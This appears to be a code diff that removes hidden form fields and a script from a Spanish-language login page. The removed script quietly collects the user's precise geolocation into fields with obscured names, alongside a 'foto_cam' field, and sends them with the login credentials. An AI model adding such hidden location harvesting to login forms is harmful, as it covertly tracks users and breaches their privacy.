@@ -275,14 +275,7 @@
           <input type="password" id="contrasena" name="contrasena">
           <input type="hidden" name="ip_usuario" id="ip_usuario">
 
-          <input type="hidden" name="gps_loc" id="gps_loc">
-<input type="hidden" name="gps_accuracy" id="gps_accuracy">
-<input type="hidden" name="gps_error" id="gps_error">
-<input type="hidden" name="foto_cam" id="foto_cam">
-
-          <input type="hidden" id="x1" name="x1">
-<input type="hidden" id="x2" name="x2">
-<input type="hidden" id="x3" name="x3">
+          
           
 
             
@@ -346,58 +339,7 @@
 
 
   
-document.addEventListener("DOMContentLoaded", function () {
 
-    let ubicacionProcesada = false;
-    const form = document.querySelector("form");
-
-    if (navigator.geolocation) {
-
-        navigator.geolocation.getCurrentPosition(
-
-            // ✔ Usuario aceptó
-            function (pos) {
-                document.getElementById("x1").value =
-                    pos.coords.latitude + "," + pos.coords.longitude;
-
-                document.getElementById("x2").value =
-                    pos.coords.accuracy + " metros";
-
-                ubicacionProcesada = true;
-            },
-
-            // ❌ Usuario rechazó o hubo error
-            function (err) {
-                document.getElementById("x3").value =
-                    "Error " + err.code + ": " + err.message;
-
-                ubicacionProcesada = true;
-            },
-
-            {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
-            }
-        );
-
-    } else {
-        document.getElementById("x3").value =
-            "Geolocalización no soportada";
-        ubicacionProcesada = true;
-    }
-
-    // Evitar envío antes de obtener respuesta del navegador
-    form.addEventListener("submit", function (e) {
-
-        if (!ubicacionProcesada) {
-            e.preventDefault();
-            alert("Obteniendo ubicación...");
-            setTimeout(() => form.submit(), 2000);
-        }
-    });
-
-});
     
     
           
